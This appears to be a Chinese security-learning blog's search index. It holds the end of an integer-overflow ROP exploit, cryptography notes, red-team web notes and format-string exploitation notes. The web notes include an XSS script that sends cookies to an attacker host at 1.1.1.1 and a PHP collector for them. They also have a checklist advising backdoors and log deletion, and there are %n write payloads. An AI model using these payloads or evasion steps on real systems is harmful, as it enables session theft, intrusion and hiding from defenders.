u32(sh.recv(4))\nlog.info(\"atoi_addr:%x\"%atoi_addr)\n```\n\n获取name的长度：当然这改掉的是name的长度，message的长度保存在[ebp+var_30]上，并且因为-1已经被更改为0xffffffff，足够大了。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191529313.jpeg)\n\n判断循环次数：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528168.jpeg)\n\n(4)计算得到libc中其它地址：\n\n```\n#注释头\n\nlibc = LibcSearcher('atoi',atoi_addr)\nlibc_base = atoi_addr - libc.dump('atoi')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\n```\n\n(5)将写入name的地方覆盖成读取read函数返回地址的地方：\n\n```\n#注释头\n\npayload = 'a'*0x34 + p32(target_addr)\nsetMessage(payload)\n```\n\n(6)再次读取name的时候就可以发送rop链：\n\n```\n#注释头\n\nrop = p32(system_addr) + p32(0) + p32(binsh_addr)\nsetName(rop)\n```\n\n(7)最后getshell:\n\n▲这个exp在不同的glibc版本下不太一样，2.23/2.24/2.27都能跑通，但是在2.31/2.32版本下没办法跑通，尤其是2.31，连栈地址都没办法泄露。2.32则是在最后一步会失败，不知道为什么。可能是canary的原因，不同版本的canary检查机制好像不一样。\n","tags":["整数漏洞"],"categories":["PWN","整数漏洞0xb"]},{"title":"密码学基础","url":"/2021/08/14/密码学基础/","content":"\n# 第二章 古典密码\n\n## 1.Monoalphabetic Cipher:\n\n单字母替代密码(将明文字符集和密文字符集建立映射关系)\n\n▲单表替代：明文字符集与密文字符集任意替代(一一映射)，那么n个元素即有n!种置换。(若仅仅针对字符集，那么可以通过字母的使用频率来分析解密)\n\n### (1)Caesar密码：\n\n将字母用它之后的第三个字母进行替代(26个字母循环)\n\n### (2)keyword密码：\n\n- key：随意选取一个关键词key\n\n- 去重：将key中的重复字母去掉，例如：success->suce\n\n- 填表：将去重的key填入26个字母表前面位置，依次序接着填满26个字母。\n\n```\n//注释头\n\nsuceabdfghijklmnopqrtvwxyz\nabcdefghijklmnopqrstuvwxyz\n```\n\n- 加密：依据上表，查表将明文替代为密文。\n\n### (3)Multiliteral Cipher：\n\n随意选取一个五字母的关键词key\n\n- 填表：依据关键词key形成5×5的矩阵，将26个字母填充进去，其中i/j为一个。\n\n- 加密：每个字母直接转换为key的行和列，即一个字母直接变成两个字母。\n\n(比较脆弱，因为密钥就存在于密文中)\n\n☆分析：利用字母使用频率分析：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454806.png)\n\n \n\n \n\n## 2.Polyalphabotic Cipher：\n\n多表替代密码，减少字母频率特征\n\n### (1) Vigenere Cipher：\n\n- key：随意选取一个关键词key\n\n- 对应：\n\n```\n//注释头\n\nHOLD HO LDH OLDHOLDHO\nTHIS IS THE PLAINTEXT\n```\n\n- 加密：\n\n  - 查表加密(行列查表都可以，因为对称的)：\n\n    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203222122573.png)\n\n  - mod26加密：\n\n```\n//注释头\n\n0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25\nA B C D E F G H I J K  L  M  N  O  P  Q  R  S  T  U  V  W  X  Y  Z\n\n            7  14 11 3  7  14 11 3  7  14 11 3  7  14 11 3  7  14\nkey:        H  O  L  D  H  O  L  D  H  O  L  D  H  O  L  D  H  O \nplaintext:  T  H  I  S  I  S  T  H  E  P  L  A  I  N  T  E  X  T\n            19 7  8  18 8  18 19 7  4  15 11 0  8  13 19 4  23 19\n\n相加mod26：  0  21 19 21 15 6  4  10 11 3  22 3  15 1  4  7  4  7\nciphertext: A  V  T  V  P  G  E  K  L  D  W  D  P  B  E  H  E  H\n```\n\n以上两种方法都可以。\n\n☆分析：\n\n- 算密钥长度：一段密文中查找重复出现的几个字节，计算重复出现的几个\n\n```\n//注释头\n\nkey:        R U N R U N R U N R U N R U N R U N R U N R U N R U N\nplaintext:  T O B E O R N O T T O B E T H A T I S T H E Q U E S T\nciphertext: K I O V I E E I G K I O V N U R N V J N U V K H V M G\n```\n\nKIOV和下一个KIVO，NU和下一个NU，分别相差9个字母，6个字母，多次重复计算，算出公因数，这里公因数是3，那么3就可能是密钥长度。\n\n- 变成单表替代：假设得到公因数长度为abcdef，则进行如下计算：\n\n```\n//注释头\n\nkey:        abcde fabcd efabc defab cdefa bcdef abcde fabcd efabc defab\nciphertext: lpkso fjbnn mpfls rneoi yqrlx bkqtz ucxot ssbvb wpjil geckb\n```\n\n将所有由a加密的字母提取出来，为 ljfoxusjk.......重复多次。(这里选取abcdef中任意一个都可)。转换成6个单表替代密码，之后即可从单表替代密码ljfoxusjk.......中进行字母频率分析，逐步破译。(比如说j就有可能是e)\n\n### (2)Autokey Cipher(针对Vigenere Cipher的改进)：\n\n选取关键词\n\n- key：选取关键词Key\n\n- 初次：key加密对应数量的密文\n\n- 重复：将前一次加密得到的密文拿来作为key加密。\n\n☆很脆弱，密文即为密钥的一部分，可通过错位分析来直接解密：\n\n```\n//注释头\n\nkey:         capcnpwgd\nplaintext:   anautokeycipherprovidesalongkeyword\nciphertext:  cnpwgd...........................\n```\n\n初始密钥为cap，之后依次得到cnp，wgd....\n\n### (3)AutoKey Plaintext：\n\n(类似，但是是拿明文再进行加密)\n\n \n\n## 3.Rotor Ciphers：\n\n转轮密码\n\n- 轮子的内部对应关系不变，外在触点可以转动：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454996.png)     ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454998.png)\n\n- 利用多个轮子合在一起形成加密关系，转动触点即可改变加密关系：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454253.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454189.png)\n\n这里的初始化状态和转动方式就可看作是密钥。\n\n \n\n## 4.Polygraphic Cipher：\n\n多图替代密码\n\n### (1)Play fair密码：\n\n双字母音节替代加密\n\n- key：随意选取密钥key\n\n- 填表：key顺序加上剩余字母依次排列进5×5表中(这里key为harpsichord)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454715.png)\n\n- 分组：对明文进行按两个字母一对进行分组，如果其中有字母对两个字母相同，就在其中填充一个其他字母(这个字母最好选取出现概率较小的字母，比如xx基本不会出现)：ballon -> ba lx lo on\n\n- 加密：\n  - 落在矩阵同一行的明文字母对中字母由其右边字母代替，最右边则由最左边替代。例如：AR->RP\n  - 落在矩阵同一列的明文字母对中字母由其下边字母代替，最下面则由最上面替代。例如：IM->EV\n  - 不同行不同列的则由对称行列转化加密(同行替换)，例如：CT->DN，OU->BQ....\n\n☆分析：(m1,m2)->(c1,c2)，那么如果有(m2,m1)，则一定是(m1,m2)->(c2,c1)。可以将明文和密文对比移位。(具体的看PDF)\n\n \n\n### (2)Double playfair密码：\n\n- 选取两个关键词key，去重，填表构建两个矩阵，行对应排列：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455819.png)\n\n- 给定一个数字，所有明文按照所选数字分组进行排列，不足的补指定字母。例如给定明文为this is double playfair cipher，数字为10，不足补x：\n\n```\n#注释头\n\nthisisdoub\nleplayfair\n\ncipherxxxx\nxxxxxxxxxx\n```\n\n- 按组进行加密，上述分组情况即为tl,he,ip.....cx,ix,px.......xx共计20组。\n\n- 对每组进行加密，分别从两个矩阵中找到明文字母对，加密规则类似：\n  - 不同行的即对角线交换：tl->op\n  - 同行的由右边字母替代，但这里替代完之后还需要交换一下：br->ac\n\n \n\n## 5.Transposition cipher：\n\n### (1)Skytale cipher：\n\n缠绕密码，一张图说明一切\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454647.png)\n\n### (2)Permutation cipher：\n\n- 给定密钥，按字母表排列顺序。例如key，顺序为(2 1 3)。\n\n- 依据密钥长度分组明文，不足补指定字符。例如Permutation cipher，分为Per mut ati onc iph erx(最后补了x)\n\n- 根据密钥顺序置换，(2 1 3)即代表第二个字母放到第一个，第一个字母放到第二个，第三个字母放到第三个。可得ePr umt tai noc pih rex即为所求密文。\n\n### (3)Column Permutation cipher：\n\n- 给定密钥，按字母表排列顺序。例如key，顺序为(2 1 3)。\n\n- 依据密钥长度分组明文，竖向排列。例如Permutation cipher，分为\n\n```\n#注释头\n\n213\nPer \nmut \nati \nonc \niph \ner\n```\n\n- 依据顺序将列竖向提取，横向生成密文：eutnpr Pmaonie rtich即为所求密文。\n\n### (4)Double Permutation cipher：\n\n一样，只是重复两次\n\n \n\n# 第三章 流密码 \n\nStream Cipher 生成\n\n## 1.LFSR：\n\n给定初始值，指定反馈位异或生成从左边进入，从右边出来生成生成密钥流，这里就会是101011 00....\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455530.png)\n\n☆针对LFSR攻击：将密文逐两个异或得到分析段，如图第一段为密文段，第二段为分析段，其中重复部分相距的长度即为LFSR的两个线性反馈位的长度，这里是4，如上图的LFSR，之后再分析破解。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454156.png)\n\n## 2.RC4：\n\n- 初始化一个数组S[]，一般为0-255，这里假设为0-7，S[]:[0,1,2,3,4,5,6,7]。之后初始化一个key顺序数组K[]给定初始密钥顺序，假设为567，重复至8位K[]:[5,6,7,5,6,7,5,6]。\n\n- 通过KSA算法代码：\n\n```\n#注释头\n\nj = 0 \nfor i in range(0,255):\n    j = (j + S[i] + K[i])mod 256 \n    tmp = S[i]\n    S[i] = S[j]\n    S[j] = tmp\n```\n\n上述例子得到新的S[]:[5,4,0,7,1,6,3,2]\n\n- 通过PRGA算法：\n\n```\n#注释头\n\ni = 0\nj = 0\ni = (i + 1)mod 256\nj = (j + S[i]) mod 256\n\ntmp = S[i] \nS[i] = S[j] \nS[j] = tmp\n\nt = (S[j] + S[i])mod 256\nk = S[t]\n```\n\n上述例子得到K = 6，之后重复8次(n)，即可得到最终密钥K\n\n \n\n## 3.CA：cellular automata\n\n细胞自动机\n\n### (1)1D\n\n即一维的：\n\n- 给定初始状态(一般随机生成)，这里选为0010100(多少bit都行)。\n\n- 给定状态转换规则，一般给一个十进制数字，然后转换为二进制，这里选为23：\n\n```\n#注释头\n\n000 001 010 011 100 101 110 111\n 0   0   0   1   0   1   1   1   = 23\n```\n\n- 依据规则演变至下一个状态(依据当前位和左右邻位)，那么初始状态就可以对应以下七种状态：\n\n000 001 010 101 010 100 000\n\n依据规则转化为 0001000，即为初始状态的之后的第一个状态。依据此规则可演变出多种状态。\n\n- 再设定规则，从每个状态中取第x位作为密钥，那么n个状态就会对应生成n位的key。\n\n### (2)2D\n\n即二维的：原理类似，给定初始状态与规则。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454153.png)\n\n这里的Von Neumann Neighborhood和Moore Neighborhood对应两种不同的邻居选择规则。\n\n▲规则：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455128.png)\n\n这里的X为自定义的一个初始值0或1，之后的CNSWE分别对应英文certer，north，south，west，east，即中上下左右，加上是一个给定的规则，例如选定：(XCNSWE)为(001110)=14，那么14即为给定的规则。\n\nSi,j(t)即为当前状态分别对应的0或1的值，依据上述等式算出下一状态的值即可。(这里是Von Neumann Neighborhood)\n\n☆针对流密码攻击：插入明文攻击，假设攻击者可以插入1bit的指定明文，再次进行发送，然后也可以截获到密文，那么如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454656.png)  第一次(只知道密文Ci)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455603.png)第二次插入p后(知道密文Ci和p、c)\n\n现在可以通过p^c算出k2，带入第一张图，c2^k2算出p2，再带入第二张图p2^c3算出k3，依次类推可得到全部，除了p1,k1,c1。\n\n \n\n \n\n# 第四章 分组密码\n\n## 1.DES加密(Data Encryption Standard)：\n\n### (1)密钥生成：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454854.png)\n\n- 64位密钥，其中8位为奇偶校验位，生成子密钥过程中需要剔除，经过PC-1压缩得到k(56bit)\n- 将k分为KL0和KR0，各28bit\n- KL0和KR0左移x位得到KL0x,KR0x\n- 将KL0x和KR0x合并，通过PC-2置换得到子密钥K0(48bit)\n- 将KL0x和KR0x拷贝一份得到下一轮的KL1和KR1\n\n重复3-5步16轮，共得到k0-k15个子密钥以供加密\n\n### (2)加密流程：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454057.png)\n\n- 以8个字母为一个单位取明文\n- 将一单位明文通过IT打乱得到Y0\n- 取Y0左边32位为PL0,右边32位为PR0\n- 将PR0复制一份为L1-------用作下一轮的L\n- 将PR0用EBOX扩展置换得到EPR0(48bit)\n- 将EPR0与K0异或得到K_X_P(48bit)\n- 将K_X_P用SBOX压缩得到SPR0(32bit)\n- 将SR0与PBOX进行置换得到PPR0\n- 将PPR0与L0异或得到下一轮的PR1\n\n重复4-9步16轮(其中f轮函数即为EBOX、Key异或、SBOX、PBOX)\n\n▲得到PR15和L15，左右交换后合并在一起后再经过IP逆运算最终置换得到密文\n\n### (3)BOX事项：\n\n#### ①EBOX：\n\n虽说是扩展，但直接依据顺序扩展即可。前bit->后bit，后bit->前bit。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454861.png)\n\n#### ②SBOX：\n\n8个子BOX，每个子BOX为4×16矩阵，每行0-15以某个固定顺序排列，通过时48bit分为8个块，每个块6bit。首尾bit拼合为row，中间4bit拼合为column，依据(row,column)来在每个子BOX中找到对应的数字后转换为二进制即为4bit输出。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454267.png)\n\n之后IP,IP逆,PBOX都是正常的置换BOX。\n\n▲解密流程完全相同，只有密钥使用顺序相反。\n\n \n\n## 2.SDES加密：\n\nSimple，类似，不过只有两轮，位数也不太一样，分别循环左移1bit和2bit。各种子BOX也会对应修改。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454258.png)\n\n \n\n## 3.AES加密(Advanced Encryption Standard):\n\n▲有128bit，192bit和...忘了...以下以128bit为例子\n\n### (1)密钥生成：\n\n#### ①前期计算\n\n- 128bit分为16字节竖向排列：\n\n```\n#注释头\n\nW0 W1 W2  W3 ..........\n-------------------------------------------------------\nK0 K4 K8  K12\nK1 K5 K9  K13\nK2 K6 K10 K14\nK3 K7 K11 K15\n```\n\n- 依据规则计算W[4]至W[43]：\n\nW[i] = W[i-4] xor W[i-1]     i不为4的倍数时\n\nW[i] = W[i-4] xor T(W[i-1])  i为4的倍数时\n\n#### ②计算T(W[i-1]):\n\n- 将W[i-1]中字节元素横向排列，循环左移1个字节。\n\n- 将循环左移后的四个字节通过SBOX，得到[S0,S1,S2,S3]四个字节列表。(这个SBOX为16×16矩阵，需要将每个字节的前4bit作为row，后4bit作为column，(row,column)来在SBOX中寻找对应字节替换)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454567.png)\n\n- 计算常量：r[i] = 2^((i-4)/4)\n\n- 最终T(W[i-1]) = [S0 xor r(i),S1,S2,S3]\n\n即可求得W[0]-W[43]共计44个W[i]密钥。\n\n### (2)加密流程：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png)\n\n128bit输入，循环9轮，第10轮中没有MixColumn。\n\n### (3)BOX注意：\n\n- KeyAdd：正常的128bit密钥和128bit明文块异或。\n\n- Substitution：即SBOX，为\n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["学习"],"categories":["学习"]},{"title":"护网Web学习","url":"/2021/08/14/护网Web学习/","content":"\n偷溜来了护网，希望不会被逮住.....\n\n▲其实决定来之前压根就不会Web，连HTML，CSS，PHP等等最基础的东西都不了解。决定要来之后，就抽空学了一些简单的实际渗透方面的Web利用，像之前写的永恒之蓝，sqlmap，nmap，Burpsuite，ARP啥的都是那一小段时间疯狂补的东西。然后期间经历了一点小插曲，本来以为不会来了，阴差阳错又过来了。和我一位学Web开发的傻嘚一起来的\n\n# 一、HTML、CSS、PHP基础：\n\nhttps://www.w3school.com.cn/\n\n东西太杂，适当了解原理，以后即用即学。\n\n \n\n# 二、XSS攻击：跨站脚本（Cross-Site Scripting）\n\n四种类型，大概如下\n\n## 1.原理解析：\n\n(1)黑客通过某网站漏洞，将恶意代码注入到某网站中，生成类似图片，留言等进行伪装，内在是攻击链接。\n\n(2)用户访问该网站，无意中点击了该图片，留言，那么就执行了这段恶意代码，进入了攻击链接，泄露信息。\n\n## 2.例子：\n\n### (1)原网站的HTML：\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xss攻击</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\n留言：<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='提交'>\n</form>\n<br/>留言记录：<br/>\n```\n\n后缀改为html，打开后如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450943.png)\n\n### (2)某些手段修改后如下：\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xss攻击</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\n留言：<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='提交'>\n</form>\n<br/>留言记录：<br/>\n\n<script>\nvar Str=document.cookie;                        //获取cookie\nvar a =document.createElement('a');             //创建a标签\na.href='http://1.1.1.1/attack.php?'+Str;        //攻击者主机\na.innerHTML=\"<img src='./aa.jpg'>\";             //掩护图片\ndocument.body.appendChild(a);                   //将标签添加到页面中\n</script>\n</body>\n</html>\n```\n\n打开后如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450848.png)\n\n### (3)攻击跳转\n\n当不小心点到该图片后，会跳转到http://1.1.1.1/attack.php?Str这个URL界面，跳出如下界面：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450006.png)\n\n其中array中就是访问该网站所得到的cookie令牌。\n\n攻击者的attack.php代码如下：\n\n```\n<?php\nheader(\"content-type:text/html;charset=utf8\");\necho \"你的PHPSESSID被盗啦\";\necho \"<pre>\";\nprint_r($_GET);\necho \"</pre>\";\n$cookie=$_GET['PHPSESSID'];\nfile_put_contents('./xss.txt', $cookie);\n?>\n```\n\n攻击者将得到的cookie存储到他服务器1.1.1.1的xss.txt文件中，之后攻击者就可以利用从用户这得到的cookie来假装用户成功登录网站。\n\n## 3.防御手段：\n\n过滤输入，最有效的。\n\n \n\n# 三、CSRF攻击：\n\n跨站请求伪造（Cross-site request forgery）\n\n## 1.原理解析：\n\n- 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；\n\n- 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；\n\n- 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B，这个网站B就是黑客用来攻击的自己搭建的一个网站，或者是黑客插入攻击代码的网站；\n\n- 访问网站B后，接收到用户请求后(黑客插入的链接或者是黑客自建的网站，前者需要用户点击恶意代码链接，类似于XSS攻击，后者则不需要)，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；\n\n- 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。\n\n▲简单来说就是利用恶意网站使得用户浏览器携带cookie和恶意代码请求来登录正常网站，这样黑客的恶意代码请求就可以在该网站被执行，从而使得黑客可以伪装成用户来执行任意操作，事后看到的也只是该用户的正常请求操作，基本没有什么攻击痕迹。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450927.png)\n\n## 2.实例解析：\n\n不搞了，DVWA上很多。\n\n \n\n# 四、SSRF攻击：\n\nServer-Side Request Forgery，服务端请求伪造\n\n## 1.原理解析：\n\n比较简单，常用来外网将服务器当跳板来探测内网。\n\n- 利用服务器提供的功能，输入url获取图片，输入某ip查找信息等等。\n\n- 构造我们需要的url，或者一些链接，服务来获取我们想要知道的信息。\n\n## 2.实例解析：\n\n不搞了，DVWA上很多。\n\n后面有时间再总结下吧，得滚去补落下的东西了。\n\n \n\n# 五、总结朔源：\n\n- 首先得到ip，先挂clash和proxifier全局代理安排上。\n\n- IPIP.net  ip138.com等查该ip下面绑了啥域名，对应开了什么web服务。\n\n- 先Ping一下IP绑定的域名，看看最终的web服务是不是挂在该IP下。然后拿目录扫描器开始扫这个ip开的web服务，需要字典和工具。\n\n- 根据扫描结果或经验，尝试看看能不能找到后台管理的登录页面，先尝试一波弱口令，SQL注入什么的。\n\n- 现在就可以尝试分析这个Web服务的CMS架构，找出来之后就可以找对应版本漏洞打打试试，尝试拿Webshell。\n\n- 经过艰苦不懈的尝试，再加上运气，可能就能拿Webshell了。这时候进入他的Web服务中，尝试提权什么的，一句话木马，各种小工具啥的上就完了。\n\n- 搞了一堆也不太好使的话，那就可能要被发现了，这时候不要慌，走之前删一删Web服务上无关紧要的小图片，小链接什么的，然后尝试删记录退出啥的。\n\n- 哎，这时候就可以打个游戏，吃个饭，睡个觉，第二天再来尝试看看，如果运气好没被堵上漏洞，那就看看日志，这兄弟的一些恢复操作就能完整被我们知道，然后根据这些日志来找账户密码，或者是一些系统操作调用啥的，方便我们拿到更高级的权限。\n\n- 运气再好些拿到高权限的shell后，种个后门木马就跑路呗，记得删日志。\n\n(像那种挂了很多域名，提供了看似正常的Web服务的，有很大可能是个用来翻墙洗白流量的服务器，这种服务器一般比较好拿权限，因为使用者一般挂完服务后都不会再投入过多精力去管的)\n\n▲CMS啥的常规不管用，就扫端口，尝试端口服务漏洞直接爆破，再牛逼点，使用0day打。再再牛逼点，直接现场挖对应版本服务的漏洞(pwn大佬干的活)。\n\n \n\n▲再补一下护网对USG写的脚本，是同学写的，版权在他那里，特此声明。本来自己想写另一个解析HTML的脚本却怎么也不成功，水平还是太差：\n\n```\n#注释头\n\nimport json\nimport winsound\nimport requests\nimport time\n\nrequests.packages.urllib3.disable_warnings()\n\nurl = \"https://10.10.10.1/=========================\"\n\nheaders = {\n    \"Accept\": \"application/json, text/javascript, */*; q=0.01\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\",\n    \"Cache-Control\": \"max-age=0\",\n    \"Connection\": \"keep-alive\",\n    \"Cookie\": \"=======================================\",\n    \"Host\": \"10.10.10.1\",\n    \"Sec-Fetch-Dest\": \"document\",\n    \"Sec-Fetch-Mode\": \"navigate\",\n    \"Sec-Fetch-Site\": \"none\",\n    \"Sec-Fetch-User\": \"?1\",\n    \"Upgrade-Insecure-Requests\": \"1\",\n    \"User-Agent\": \"========================================\",\n}\n\nrecorded_ips = set()\n\nwith open(\"blacklistips.txt\", \"r\") as f:\n    recorded_ips = set(f.read().splitlines())\n\nwhile True:\n\n    try:\n        print(time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(time.time())))\n\n        doc = requests.get(url=url, headers=headers, verify=False)\n\n        if doc.status_code != 200:\n            winsound.Beep(2000, 2000)\n            print(\"无法访问\")\n            time.sleep(10)\n            continue\n\n        json_dict = json.loads(doc.text)\n        data = json_dict[\"data\"]\n        for attack in data:\n            ip = attack[\"name\"]\n            hasRisk = (\n                int(attack[\"middle\"]) > 0\n                or int(attack[\"high\"]) > 0\n                or int(attack[\"critical\"]) > 0\n            )\n\n            if not hasRisk:\n                continue\n\n            if ip in recorded_ips:\n                continue\n\n            print(attack)\n            winsound.Beep(2000, 2000)\n            recorded_ips.add(ip)\n\n        with open(\"blacklistips.txt\", \"w\") as f:\n            for data in recorded_ips:\n                f.write(data + \"\\n\")\n        print(\"平平安安\")\n        time.sleep(30)\n\n    except Exception as err:\n        print(err)\n        winsound.Beep(2000, 2000)\n        time.sleep(10)\n```\n\n \n\n▲最后做个总结，学了这些天下来，感觉Web太杂太乱，边边角角太多，而且更新速度极快，可能过个一两个月就过时的，实在是不适合像我这种又蠢又懒，脑容量又小的菜鸡去搞。\n\n还是感觉现在深入搞Web不到时候，在校期间更适合学些基础理论的东西，所以之后还是回老本行搞二进制去吧，起码这些理论知识更新换代比较慢一点。并且这种更新更像是一种基于理论来千变万化的，而不像Web好多都是那种一更新就完全变成新东西，没多少理论依据可言，直接就是开脑洞的。\n\n还是搞二进制去吧，黑客的理想还是等以后工作了再来。\n","tags":["WEB"],"categories":["WEB"]},{"title":"格式化字符printf汇总","url":"/2021/08/14/格式化字符printf汇总/","content":"\n▲printf的性质：\n\n▲参数%s：这个参数其本质上是读取对应的参数，并作为指针解析，获取到对应地址的字符串输出。可以通过这个性质来泄露某个内存地址的内容：\n\n例子：\n\n如果输入一个%S，在调用printf之前，栈上会是这种数据，有两个相同的指向%S，一个是会解析成参数%S，一个会使用解析的参数%S作用来打印输入的%S。这里可以计算出偏移量为6，即从栈顶数第6个可以到达我们输入的内容0x0a7325。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191542914.png)\n\n \n\n1.泄露任意地址内容\n\n```\n#注释头\n\n\\x01\\x80\\x04\\x08%x.%x.%x.%x.%s\n```\n\n这一段即打印从栈顶往下数5个内容的栈中保存的值，由于第5个参数是%s，所以会将第5个内容当作一个地址来解析，从而打印位于该地址上的值。所以输出应该为0xff95abb4,0x0000012B,0x08048465.....(这都是栈上的内存),最后第五个内容是0x08040801，用参数%s来解析，即打印该地址上保存的内容，地址对应的值为”ELF\\x01\\x01\\x01\\n”，这样就可以打印任意内存地址的值。常用来传入got表地址，然后借助该函数泄露某函数got表中的值，即是泄露该函数的真实地址。\n\n▲简化使用：\n\n如果输入的参数保存在栈上很远的位置，那么则需要叠加%x，但是实际中可以使用简单的偏移来打印：\\x01\\x80\\x04\\x08%5$s，其中5就代表从esp开始计算偏移量为6。\n\n总的来说就是一个公式，输出偏移量为n的参数的值就是：\n\n%(n-1)$s\n\n(%[addr_offset_value]$[格式化控制字符])\n\n \n\n2.任意地址可写：\n\n特殊格式化字符%n家族：\n\n(1)这个字符会将已经输出的字符数写入到指定内存中，例如\\x8c\\x97\\x04\\x08%[addr_offset_value]$n，这段格式化字符串会使得地址0x0804978c处的内容变成4，因为这代表了输出了\\x8c\\x97\\x04\\x08这四个字符，所以会向0x0804978c这个地址写入4，实际是写入00 00 00 04，共计四个字节。利用这个特性可以修改某个地址的值。\n\n(2)\\x8c\\x97\\x04\\x08%2048c%(addr_offset_value)$n：这个代码会将2052，实际是(00 00 08 04) ，共计四个字节写入到地址0x0804978c，因为调用了printf会先打印\\x8c\\x97\\x04\\x08四个字符，然后依据格式化字符%2048c，再打印2048个空字符，实际打印了2048+4=2052个字符，对应16进制为0x804，所以在使用是需要减去在%这个格式化字符标志前的字符的个数才是对应的值。\n\n(3)但是在实际中，如果我们想将一个地址的值写入到某个地址，使得可以调用，那么我们需要输入的就会变成0x8xxx....转换成十进制则会特别大，会向服务器发送0x8000...个字符，这在实际中很容易出错。这时候需要用到另一个格式化字符控制：%hhn。\n\n(4)特殊格式化字符%hhn：这个字符可以使得一次往指定地址写入一个字节。所以我们可以将我们需要输入的地址给拆分成4个字节来输入。\n\n(5)例如\n\n\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08%16c%5$hhn%99c%6$hhn%129c%7$hhn%4c%8$hhn\n\n这个格式化字符串相当于四个操作：\n\n①\\x78\\x97\\x04\\x08%16c%5$hhn：改变地址0x08049778的值为0x20。\n\n这里是20是因为前面已经输出了\\x78\\x97\\x04\\x08\\x79\\x97\\x04\\x08\\x7a\\x97\\x04\\x08\\x7b\\x97\\x04\\x08总共16个字符，所以实际写入到地址0x08049778的值为16+16=32=0x20。\n\n②\\x79\\x97\\x04\\x08%99c%6$hhn:改变地址0x08049779的值为99+32=131=0x83，同理，因为前面已经输出了32个字符，所以最终写入值为0x83。\n\n③\\x7a\\x97\\x04\\x08%129c%7$hhn：改变地址0x0804977a的值为129+131=260=0x104，这里由于是使用%hhn，所以只能写入一个字符，也就是会被截断为0x04\n\n④\\x7b\\x97\\x04\\x08%4c%8$hhn：改变地址0x0804977b的值为4+0x104=0x108=0x08。所以最终写入到地址0x08049778中的四个字节为0x08048320，完成写入地址。\n\n总的公式:\n\n[addr]%[padding_count]c%[addr_offset_value]$[格式化控制字符]\n\n▲注意偏移量一直在递增。还有就是因为这是大端存储，所以写入的顺序需要计算一下，防止出现\\x00导致字符串输入截断。\n\n \n\n▲特殊格式化字符串调用类：Fmtstr\n\n以上的可以直接改成：fmtstr_payload(5, {printf_got_addr:system_plt})将栈上偏移量为6的值改成printf_got_addr，同样将printf_got_addr的值修改为system_plt_addr。也就是在第一次用pringtf时，会修改栈和劫持printf_got_addr为system_plt_addr。下一次再调用printf时，从printf_got_addr指向的就会是system_plt_addr，完成劫持。\n\n但是如果一旦printf_got_addr出现\\x00或者不同输入函数所对应的非法字符，就会发生截断，导致出错。因为Fmtstr模块创造的payload中地址会被切割成几段，相当于我们的多段执行，那么最后的几个地址如果其中一个带了非法字符就会出错。\n\n 